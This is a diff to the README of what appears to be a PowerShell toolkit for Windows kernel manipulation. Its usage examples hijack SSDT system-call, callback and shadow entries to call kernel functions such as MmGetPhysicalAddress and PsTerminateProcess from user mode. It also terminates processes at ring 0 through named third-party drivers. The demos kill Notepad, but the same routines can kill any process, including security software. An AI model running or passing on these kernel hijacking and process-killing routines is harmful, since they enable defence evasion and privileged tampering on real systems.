@@ -209,7 +209,7 @@ tskill /a notepad
 # Ring 0 Kill
 Start-Sleep -Seconds 1
 
-Invoke-SsdtNtCallHijack -Function PsTerminateProcess -Values @($eProc)
+Invoke-SsdtNtCallHijack -Function PsTerminateProcess -Values @($eProc, 0L, 0L)
 Terminate-SystemProcess -ProcessID $PROCID -DriverName BdApiUtil
 Terminate-KernelProcess -ProcID $PROCID    -Driver d591004
 ```
@@ -300,39 +300,85 @@ Index ProcessName    PETHREAD_Address   ThreadID IsMainThread PreviousMode Previ
     1 powershell_ise 0xFFFFC3823EEAA080   5656         True 1 (UserMode) 0xFFFFC3823EEAA2B2 0xFFFFC3823EEAA568 134261727195048761 17/06/2026 15:25:19.504
     2 powershell_ise 0xFFFFC3823FFE6080   4780        False 1 (UserMode) 0xFFFFC3823FFE62B2 0xFFFFC3823FFE6568 134261727195120853 17/06/2026 15:25:19.512
 ````
-### 11. Ssdt Callback Hijack For Win32K, Ntoskrnl.exe
+### 11. Ssdt Callback Hijack For Win32K, Ntoskrnl.exe For \ Main, Shaddow \
 hijack NT Kernel Address, And invoke it From user Mode, Work Only in build < 22000
 ````powershell
 Clear-Host
 Write-Host
+Write-Host "=== Kernel Hook Test Results ===" -ForegroundColor Cyan
+Write-Host "---------------------------------" -ForegroundColor Gray
 
+# 1. Virtual to Physical Resolution
 $KernelVA = Get-KernelBaseAddress
-"VA: 0x{0:X16}" -f [Int64]$KernelVA
+$Func     = "MmGetPhysicalAddress"
+$Values   = @($KernelVA, 0L, 0L)
 
-$PA = Convert-VirtualToPhysical `
-    -VirtualAddress $KernelVA
-if ($PA -notin @(0,1)) {
-    "PA: 0x{0:X16}" -f $PA
+# Format VA cleanly
+$FormattedVA = "0x{0:X}" -f [Int64]$KernelVA
+Write-Host "Target Kernel VA : $FormattedVA"
+
+try {
+  $PA_Direct   = Convert-VirtualToPhysical -VirtualAddress $KernelVA
+} catch {}
+
+try {
+  $Handle      = [BitConverter]::ToUInt64([BitConverter]::GetBytes([Int64]$KernelVA), 0)
+  $PA_TABLE    = Resolve-DirectoryTable -VA $Handle -ProcessID 4
+} catch {}
+
+try {
+  $PA_NtCall   = Invoke-SsdtNtCallHijack $Func $Values
+} catch {}
+
+try {
+  $PA_Callback = Invoke-SsdtCallbackHijack $Func $Values
+} catch {}
+
+try {
+  $PA_Shaddow  = Invoke-SsdtShadowCallHijack $Func $Values
+} catch {}
+
+Write-Host ("PA (NtCall)      : 0x{0:X}" -f $PA_NtCall)
+Write-Host ("PA (Callback)    : 0x{0:X}" -f $PA_Callback)
+Write-Host ("PA (Shaddow)     : 0x{0:X}" -f $PA_Shaddow)
+Write-Host ("PA (cr3 Table)   : 0x{0:X}" -f $PA_TABLE)
+Write-Host ("PA (Direct)      : 0x{0:X}" -f $PA_Direct)
+Write-Host "---------------------------------" -ForegroundColor Gray
+
+# 2. Process Termination Tests
+
+# Helper function to turn 0 into a readable status string
+function Get-StatusString ($StatusCode) {
+    if ($StatusCode -eq 0) { return "SUCCESS (0x00000000)" }
+    else { return "FAILED (0x$("{0:X8}" -f $StatusCode))" }
 }
 
-$PA = Invoke-SsdtNtCallHijack `
-    -Function MmGetPhysicalAddress `
-    -Values @($KernelVA) `
-    -ReturnMode Int64
-if ($PA -notin @(0,1)) {
-    "PA: 0x{0:X16}" -f $PA
-}
+# Test 1: NT Call Hijack
+$PROCID = Start-Process -FilePath Notepad -WindowStyle Normal -PassThru | Select-Object -ExpandProperty Id
+$eProc  = Query-EprocessStruct -ProcessID $PROCID
+$Result1 = Invoke-SsdtNtCallHijack PsTerminateProcess @($eProc, 0L, 0L)
+$Color1  = if ($Result1 -eq 0) { "Green" } else { "Red" }
+Write-Host "NtCall Hijack     -> Notepad (PID: $PROCID)"
+Write-Host "$(Get-StatusString $Result1)" -ForegroundColor $Color1
 
-$Values = $KernelVA, 0L
-$PA = Invoke-SsdtCallbackHijack `
-    -Function MmGetPhysicalAddress `
-    -Values $Values
-if ($PA -notin @(0,1)) {
-    "PA: 0x{0:X16}" -f $PA
-}
+# Test 2: Shadow Call Hijack
+$PROCID = Start-Process -FilePath Notepad -WindowStyle Normal -PassThru | Select-Object -ExpandProperty Id
+$eProc  = Query-EprocessStruct -ProcessID $PROCID
+$Result2 = Invoke-SsdtShadowCallHijack PsTerminateProcess @($eProc, 0L, 0L)
+$Color2  = if ($Result2 -eq 0) { "Green" } else { "Red" }
+Write-Host "ShadowCall Hijack -> Notepad (PID: $PROCID)"
+Write-Host "$(Get-StatusString $Result2)" -ForegroundColor $Color2
 
-Write-Host
-return
+# Test 3: Callback Hijack
+$PROCID = Start-Process -FilePath Notepad -WindowStyle Normal -PassThru | Select-Object -ExpandProperty Id
+$eProc  = Query-EprocessStruct -ProcessID $PROCID
+$Result3 = Invoke-SsdtCallbackHijack PsTerminateProcess @($eProc, 0L, 0L)
+$Color3  = if ($Result3 -eq 0) { "Green" } else { "Red" }
+Write-Host "Callback Hijack   -> Notepad (PID: $PROCID)"
+Write-Host "$(Get-StatusString $Result3)" -ForegroundColor $Color3
+
+Write-Host "---------------------------------" -ForegroundColor Gray
+Write-Host "[+] All execution routines finished." -ForegroundColor Green
 ````
 ### 12. Hardware-vs-Software-MemoryBridge
 A side-by-side comparison of manual page table walking versus standard API memory acquisition
